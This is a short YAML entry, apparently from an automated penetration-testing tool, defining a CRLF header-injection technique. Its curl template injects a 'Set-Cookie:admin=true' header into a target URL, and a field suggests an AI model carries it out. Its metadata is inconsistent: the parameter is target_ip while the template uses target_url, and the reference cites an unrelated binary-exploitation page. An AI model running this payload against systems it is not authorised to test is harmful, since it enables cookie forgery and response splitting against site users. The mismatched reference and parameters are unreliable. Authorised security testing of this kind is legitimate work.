name: header_injection
category: web
description: HTTP header injection / CRLF injection
preconditions:
- service.port==80
parameters:
  target_ip: from_engagement.target_ip
command_template: curl -s '{target_url}?param=value%0d%0aSet-Cookie:admin=true'
parser: web_response_parser
expected_effects:
- header_injection_confirmed
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: "Inject CRLF (\r\n) to add headers. Can set cookies, redirect (Location header), or inject content (double CRLF\
  \ for response splitting)."
hacktricks_ref: binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md
references:
  ocd_mindmap_node_ids:
  - 9876b802e5
  - c01fb9d65b
